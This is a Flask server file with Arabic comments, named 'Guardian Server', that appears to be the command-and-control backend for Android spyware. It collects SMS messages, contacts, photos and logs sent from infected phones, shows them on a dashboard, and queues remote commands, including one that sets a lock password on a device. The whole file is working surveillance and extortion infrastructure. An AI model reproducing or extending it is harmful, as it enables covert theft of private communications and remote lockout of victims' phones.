from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory
import json
import os
import base64
import zipfile
from datetime import datetime

app = Flask(__name__)

# ══════════════════════════════════════════════
#  قاعدة البيانات (ملفات JSON بسيطة)
# ══════════════════════════════════════════════
DATA_DIR   = "data"
PHOTOS_DIR = os.path.join(DATA_DIR, "photos")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(PHOTOS_DIR, exist_ok=True)

# خدمة الصور المحفوظة
@app.route("/static/photos/<filename>")
def serve_photo(filename):
    return send_from_directory(PHOTOS_DIR, filename)


def load_json(filename):
    path = os.path.join(DATA_DIR, filename)
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def save_json(filename, data):
    path = os.path.join(DATA_DIR, filename)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ══════════════════════════════════════════════
#  API Endpoints - استقبال البيانات من Android
# ══════════════════════════════════════════════

# ① تسجيل الجهاز
@app.route("/register", methods=["POST"])
def register():
    try:
        data = request.get_json(force=True)
        data["registered_at"] = now()
        data["ip"] = request.remote_addr

        devices = load_json("devices.json")

        # تحديث الجهاز إذا كان موجوداً أو إضافته
        existing = next((d for d in devices if d.get("id") == data.get("id")), None)
        if existing:
            existing.update(data)
            existing["last_seen"] = now()
        else:
            data["last_seen"] = now()
            devices.append(data)

        save_json("devices.json", devices)
        print(f"[+] Device registered: {data.get('model')} from {data.get('ip')}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[!] Register error: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

# ② استقبال الرسائل النصية
@app.route("/sms", methods=["POST"])
def receive_sms():
    try:
        data = request.get_json(force=True)
        sms_list = load_json("sms.json")

        messages = data.get("smsList", [])
        for msg in messages:
            msg["device_ip"] = request.remote_addr
            msg["received_at"] = now()
            sms_list.append(msg)

        save_json("sms.json", sms_list)
        print(f"[+] Received {len(messages)} SMS messages")
        return jsonify({"status": "ok", "count": len(messages)}), 200
    except Exception as e:
        print(f"[!] SMS error: {e}")
        return jsonify({"status": "error"}), 500

# ③ استقبال جهات الاتصال
@app.route("/contacts", methods=["POST"])
def receive_contacts():
    try:
        data = request.get_json(force=True)
        contacts = load_json("contacts.json")

        new_contacts = data.get("data", [])
        for c in new_contacts:
            c["device_ip"] = request.remote_addr
            c["received_at"] = now()
            contacts.append(c)

        save_json("contacts.json", contacts)
        print(f"[+] Received {len(new_contacts)} contacts")
        return jsonify({"status": "ok", "count": len(new_contacts)}), 200
    except Exception as e:
        print(f"[!] Contacts error: {e}")
        return jsonify({"status": "error"}), 500

# ④ استقبال الصور (Base64)
@app.route("/upload", methods=["POST"])
def receive_photo():
    try:
        data = request.get_json(force=True)
        filename = data.get("filename", "photo.jpg")
        file_b64 = data.get("file", "")

        # حفظ الصورة
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_name = f"{timestamp}_{filename}"
        photo_path = os.path.join(DATA_DIR, "photos", save_name)

        with open(photo_path, "wb") as f:
            f.write(base64.b64decode(file_b64))

        # سجل الصور
        photos = load_json("photos.json")
        photos.append({
            "filename": save_name,
            "device_ip": request.remote_addr,
            "received_at": now()
        })
        save_json("photos.json", photos)

        print(f"[+] Photo saved: {save_name}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[!] Photo error: {e}")
        return jsonify({"status": "error"}), 500

# استقبال الصور كملف مضغوط (ZIP)
@app.route("/upload_zip", methods=["POST"])
def upload_zip():
    try:
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
            
        zip_path = os.path.join(PHOTOS_DIR, "temp_gallery.zip")
        file.save(zip_path)
        
        photos = load_json("photos.json")
        extracted_count = 0
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            for zip_info in zip_ref.infolist():
                if zip_info.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                    zip_ref.extract(zip_info, PHOTOS_DIR)
                    
                    entry = {
                        "filename": zip_info.filename,
                        "device_ip": request.remote_addr,
                        "received_at": now()
                    }
                    photos.append(entry)
                    extracted_count += 1
                    print(f"[+] Extracted photo from ZIP: {zip_info.filename}")
                    
        save_json("photos.json", photos)
        os.remove(zip_path)
        
        print(f"[+] Successfully extracted {extracted_count} photos from ZIP")
        return jsonify({"status": "ok", "extracted": extracted_count}), 200
        
    except Exception as e:
        print(f"[!] ZIP upload error: {e}")
        return jsonify({"status": "error"}), 500

# ⑤ استقبال بيانات عامة
@app.route("/data", methods=["POST"])
def receive_data():
    try:
        data = request.get_json(force=True)
        
        # ✅ التحقق من صحة البيانات
        if not data:
            return jsonify({"status": "error", "msg": "No data"}), 400
            
        # ✅ معالجة السجلات الطويلة
        if data.get("type") == "logs":
            logs = data.get("logs", "")
            if len(logs) > 50000:
                data["logs"] = logs[:50000] + "\n... (مقطوع بسبب الحجم الكبير)"
        
        data["device_ip"] = request.remote_addr
        data["received_at"] = now()

        general = load_json("general.json")
        general.append(data)
        save_json("general.json", general)

        print(f"[+] General data: {data.get('type', 'unknown')}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[!] Data error: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

# ⑥ قائمة الأوامر المعلقة (Command Queue)
command_queue = {}

# إرسال أمر لجهاز معين (من لوحة التحكم)
@app.route("/send_command", methods=["POST"])
def send_command():
    try:
        data = request.get_json(force=True)
        device_id = data.get("device_id", "all")
        command = data.get("command", "")
        
        if not command:
            return jsonify({"status": "error", "msg": "No command"}), 400
            
        # ✅ دعم قائمة انتظار لكل جهاز
        if device_id not in command_queue:
            command_queue[device_id] = []
        command_queue[device_id].append(command)
        
        print(f"[→] Command queued for {device_id}: {command}")
        return jsonify({"status": "ok", "command": command, "queue_length": len(command_queue[device_id])}), 200
    except Exception as e:
        print(f"[!] Send command error: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

# الجهاز يسأل: هل عندي أمر؟ (Polling)
@app.route("/command", methods=["GET"])
def get_command():
    device_id = request.args.get("device_id", "")
    
    # ✅ دعم قائمة انتظار لكل جهاز
    if device_id in command_queue and command_queue[device_id]:
        command = command_queue[device_id].pop(0)
        print(f"[→] Sending command to {device_id}: {command}")
        return jsonify({"command": command}), 200
    
    # ✅ إذا كان هناك أمر لـ "all"
    if "all" in command_queue and command_queue["all"]:
        command = command_queue["all"].pop(0)
        print(f"[→] Sending broadcast command to {device_id}: {command}")
        return jsonify({"command": command}), 200
        
    return jsonify({"command": "none"}), 200

# ✅ ⑥.1 تعيين كلمة سر للجهاز
@app.route("/set_password", methods=["POST"])
def set_password():
    try:
        data = request.get_json(force=True)
        device_id = data.get("device_id", "all")
        password = data.get("password", "")
        
        if not password:
            return jsonify({"status": "error", "msg": "No password"}), 400
            
        if len(password) < 4:
            return jsonify({"status": "error", "msg": "Password must be at least 4 characters"}), 400
            
        # ✅ إرسال أمر تعيين كلمة السر للجهاز
        command = f"lock:{password}"
        
        if device_id not in command_queue:
            command_queue[device_id] = []
        command_queue[device_id].append(command)
        
        print(f"[→] Password set command queued for {device_id}: {password}")
        return jsonify({"status": "ok", "password": password, "device": device_id}), 200
    except Exception as e:
        print(f"[!] Set password error: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

# ✅ ⑥.2 مسح كلمة السر من الجهاز
@app.route("/clear_password", methods=["POST"])
def clear_password():
    try:
        data = request.get_json(force=True)
        device_id = data.get("device_id", "all")
        
        # ✅ إرسال أمر مسح كلمة السر
        command = "clear_password"
        
        if device_id not in command_queue:
            command_queue[device_id] = []
        command_queue[device_id].append(command)
        
        print(f"[→] Clear password command queued for {device_id}")
        return jsonify({"status": "ok", "device": device_id}), 200
    except Exception as e:
        print(f"[!] Clear password error: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

# ══════════════════════════════════════════════
#  Web Dashboard - لوحة التحكم
# ══════════════════════════════════════════════

@app.route("/")
def dashboard():
    devices  = load_json("devices.json")
    sms      = load_json("sms.json")
    contacts = load_json("contacts.json")
    photos   = load_json("photos.json")
    general  = load_json("general.json")

    stats = {
        "devices":  len(devices),
        "sms":      len(sms),
        "contacts": len(contacts),
        "photos":   len(photos),
        "data":     len(general),
    }
    return render_template("dashboard.html",
                           stats=stats,
                           devices=devices[-5:],
                           recent_sms=sms[-5:])

@app.route("/devices")
def devices_page():
    devices = load_json("devices.json")
    return render_template("devices.html", devices=devices)

@app.route("/messages")
def messages_page():
    sms = load_json("sms.json")
    
    # تجميع الرسائل حسب رقم الهاتف
    grouped_sms = {}
    for msg in sms:
        phone = msg.get("phoneNo", msg.get("number", "غير معروف"))
        if phone not in grouped_sms:
            grouped_sms[phone] = []
        grouped_sms[phone].append(msg)
        
    return render_template("messages.html", grouped_sms=grouped_sms, total_sms=len(sms))

@app.route("/contacts_page")
def contacts_page():
    contacts = load_json("contacts.json")
    return render_template("contacts.html", contacts=contacts)

@app.route("/photos_page")
def photos_page():
    photos = load_json("photos.json")
    photos.reverse()
    return render_template("photos.html", photos=photos)

@app.route("/control")
def control_page():
    devices = load_json("devices.json")
    return render_template("control.html", devices=devices)

# API لجلب الإحصائيات (AJAX)
@app.route("/api/stats")
def api_stats():
    return jsonify({
        "devices":  len(load_json("devices.json")),
        "sms":      len(load_json("sms.json")),
        "contacts": len(load_json("contacts.json")),
        "photos":   len(load_json("photos.json")),
    })


# ══════════════════════════════════════════════
#  تشغيل السيرفر
# ══════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 50)
    print("  🛡  Guardian Server Starting...")
    print("  📡  Listening on: http://0.0.0.0:5000")
    print("  🌐  Dashboard:   http://127.0.0.1:5000")
    print("  📋  Endpoints:")
    print("      POST /send_command  - Send command to device")
    print("      POST /set_password  - Set device lock password")
    print("      POST /clear_password - Clear device lock password")
    print("=" * 50)
    app.run(host="0.0.0.0", port=5000, debug=True)
